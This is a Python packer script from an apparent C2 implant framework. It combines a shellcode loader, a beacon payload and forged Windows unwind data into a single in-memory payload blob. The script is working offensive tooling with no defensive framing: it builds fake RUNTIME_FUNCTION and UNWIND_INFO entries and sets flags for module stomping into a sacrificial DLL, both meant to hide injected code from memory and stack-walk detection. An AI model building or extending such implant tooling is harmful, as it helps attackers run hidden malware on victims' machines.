#!/usr/bin/env python3
"""Pack loader + beacon + pdata + xdata into nax.bin with NaxHeader v2."""

import argparse
import struct
import sys
import os


NAX_HDR_MAGIC   = 0x4E415832   # "NAX2"
NAX_HDR_SIZE    = 160          # fixed header size
NAX_HDR_DLL_MAX = 64           # max WCHAR chars for DLL name

FLAG_MODULE_STOMP = 0x0001
FLAG_STOMP_PDATA  = 0x0002


def read_bin(path):
    if not path or not os.path.exists(path):
        return b""
    with open(path, "rb") as f:
        return f.read()


def strip_loader_padding(loader):
    """Strip page-padding added by Stardust's build.py.

    build.py pads the extracted shellcode to 0x1000-byte page boundaries,
    but StRipEnd() returns the code end (not the file end).  Strip the
    padding and re-pad to 16-byte alignment (NASM default section alignment)
    so appended data lands where StRipEnd() points.

    NaX loaders extracted via objcopy have no trailing padding - this is
    a no-op for them.
    """
    stripped = loader.rstrip(b'\x00')
    padding = (16 - (len(stripped) % 16)) % 16
    return stripped + b'\x00' * padding


def read_text_rva(path):
    if not path or not os.path.exists(path):
        return 0
    with open(path, "r") as f:
        val = f.read().strip()
    if not val:
        return 0
    return int(val, 16)


def normalize_pdata(pdata, text_rva, xdata_rva):
    """Convert RUNTIME_FUNCTION RVAs to 0-based offsets.

    BeginAddress/EndAddress become offsets from .text start.
    UnwindData becomes offset from .xdata start.
    The loader adds target DLL RVAs at runtime.
    """
    if not pdata or len(pdata) < 12:
        return pdata
    out = bytearray(pdata)
    entry_count = len(out) // 12
    for i in range(entry_count):
        off = i * 12
        begin, end, unwind = struct.unpack_from("<III", out, off)
        begin -= text_rva
        end   -= text_rva
        unwind -= xdata_rva
        struct.pack_into("<III", out, off, begin & 0xFFFFFFFF, end & 0xFFFFFFFF, unwind & 0xFFFFFFFF)
    return bytes(out)


def build_entry_unwind():
    """Build RUNTIME_FUNCTION + UNWIND_INFO for the Entry.asm stub.

    Entry.asm prolog (22 bytes, 0x00–0x15):
      0x00  push rsi                     ; UWOP_PUSH_NONVOL RSI(6)
      0x01  mov rsi, rsp                 ; UWOP_SET_FPREG
      0x04  and rsp, -16                 ; (implicit, frame register handles it)
      0x08  sub rsp, 0x20               ; UWOP_ALLOC_SMALL (0x20/8-1 = 3)
      0x0C  call NaxMain
      0x11  mov rsp, rsi
      0x14  pop rsi
      0x15  ret

    UNWIND_INFO (8 bytes, DWORD-aligned):
      Version=1, Flags=0, SizeOfProlog=0x0C, CountOfCodes=3
      FrameRegister=RSI(6), FrameOffset=0
      UnwindCode[0]: offset=0x08, op=UWOP_ALLOC_SMALL(2), info=3 (0x20 bytes)
      UnwindCode[1]: offset=0x01, op=UWOP_SET_FPREG(3),   info=0
      UnwindCode[2]: offset=0x00, op=UWOP_PUSH_NONVOL(0), info=RSI(6)
      +2 bytes padding to DWORD align (CountOfCodes=3 → 4 slots)

    RUNTIME_FUNCTION (12 bytes, 0-based after normalization):
      BeginAddress=0, EndAddress=0x16, UnwindData=offset in xdata
    """
    UWOP_PUSH_NONVOL = 0
    UWOP_ALLOC_SMALL = 2
    UWOP_SET_FPREG   = 3
    RSI = 6

    unwind_info = struct.pack("<BBBB",
        0x01,       # Version=1, Flags=0
        0x0C,       # SizeOfProlog
        3,          # CountOfCodes
        (0 << 4) | RSI,  # FrameRegister=RSI, FrameOffset=0
    )
    unwind_info += struct.pack("<BB", 0x08, (3 << 4) | UWOP_ALLOC_SMALL)
    unwind_info += struct.pack("<BB", 0x01, (0 << 4) | UWOP_SET_FPREG)
    unwind_info += struct.pack("<BB", 0x00, (RSI << 4) | UWOP_PUSH_NONVOL)
    unwind_info += b"\x00\x00"  # pad to DWORD alignment

    runtime_func = struct.pack("<III", 0x0000, 0x0016, 0)  # UnwindData filled later

    return runtime_func, unwind_info


def encode_dll_name(name):
    wchars = name.encode("utf-16-le")
    wchars += b"\x00\x00"  # NUL terminator
    buf = bytearray(NAX_HDR_DLL_MAX * 2)  # 128 bytes
    if len(wchars) > len(buf):
        print(f"ERROR: DLL name too long ({len(name)} chars, max {NAX_HDR_DLL_MAX - 1})", file=sys.stderr)
        sys.exit(1)
    buf[:len(wchars)] = wchars
    return bytes(buf)


def build_header(beacon_size, pdata_size, xdata_size, text_rva, flags, dll_name):
    hdr = struct.pack("<IIIIII",
        NAX_HDR_MAGIC,
        beacon_size,
        pdata_size,
        xdata_size,
        text_rva,
        flags,
    )
    hdr += encode_dll_name(dll_name)
    hdr += b"\x00" * 8  # reserved
    assert len(hdr) == NAX_HDR_SIZE, f"Header size mismatch: {len(hdr)} != {NAX_HDR_SIZE}"
    return hdr


def main():
    parser = argparse.ArgumentParser(description="Pack NaX binary (loader + header + beacon + pdata + xdata)")
    parser.add_argument("--loader", required=True, help="Path to loader binary")
    parser.add_argument("--beacon", required=True, help="Path to beacon binary")
    parser.add_argument("--pdata", default="", help="Path to .pdata binary")
    parser.add_argument("--xdata", default="", help="Path to .xdata binary")
    parser.add_argument("--text-rva", default="", help="Path to text_rva file (hex string)")
    parser.add_argument("--stomp-dll", default="chakra.dll", help="Sacrificial DLL name")
    parser.add_argument("--module-stomp", action="store_true", help="Enable module stomping")
    parser.add_argument("--stomp-pdata", action="store_true", help="Enable .pdata unwind stomping")
    parser.add_argument("--output", required=True, help="Output path")
    parser.add_argument("--legacy", action="store_true", help="Use legacy v1 format (4-byte header)")
    args = parser.parse_args()

    loader = strip_loader_padding(read_bin(args.loader))
    beacon = read_bin(args.beacon)

    if not loader:
        print("ERROR: loader binary is empty", file=sys.stderr)
        sys.exit(1)
    if not beacon:
        print("ERROR: beacon binary is empty", file=sys.stderr)
        sys.exit(1)

    if args.legacy:
        hdr = struct.pack("<I", len(beacon))
        payload = loader + hdr + beacon
    else:
        pdata    = read_bin(args.pdata)
        xdata    = read_bin(args.xdata)
        text_rva = read_text_rva(args.text_rva)

        flags = 0
        if args.module_stomp:
            flags |= FLAG_MODULE_STOMP
        if args.stomp_pdata:
            flags |= FLAG_STOMP_PDATA

        if pdata and text_rva:
            align4 = lambda x: (x + 3) & ~3
            xdata_rva = text_rva + align4(len(beacon)) + align4(len(pdata))
            pdata = normalize_pdata(pdata, text_rva, xdata_rva)

            entry_rf, entry_ui = build_entry_unwind()
            ui_size = len(entry_ui)
            pdata_arr = bytearray(pdata)
            for i in range(len(pdata_arr) // 12):
                off = i * 12 + 8
                u = struct.unpack_from("<I", pdata_arr, off)[0]
                struct.pack_into("<I", pdata_arr, off, u + ui_size)
            pdata = bytes(entry_rf) + bytes(pdata_arr)
            xdata = bytes(entry_ui) + xdata

        hdr = build_header(len(beacon), len(pdata), len(xdata), text_rva, flags, args.stomp_dll)
        payload = loader + hdr + beacon + pdata + xdata

    with open(args.output, "wb") as f:
        f.write(payload)

    print(f"[+] packed  {args.output}  ({len(payload)} bytes)")
    print(f"    loader    {len(loader)} bytes")
    if args.legacy:
        print(f"    hdr       4 bytes (v1, beacon_size={len(beacon)})")
        print(f"    beacon    {len(beacon)} bytes")
    else:
        pdata_raw = read_bin(args.pdata)
        xdata_raw = read_bin(args.xdata)
        print(f"    hdr       {NAX_HDR_SIZE} bytes (v2, flags=0x{flags:04x}, dll={args.stomp_dll})")
        print(f"    beacon    {len(beacon)} bytes")
        if pdata_raw:
            print(f"    pdata     {len(pdata_raw)} bytes ({len(pdata_raw)//12} entries)")
        if xdata_raw:
            print(f"    xdata     {len(xdata_raw)} bytes")


if __name__ == "__main__":
    main()
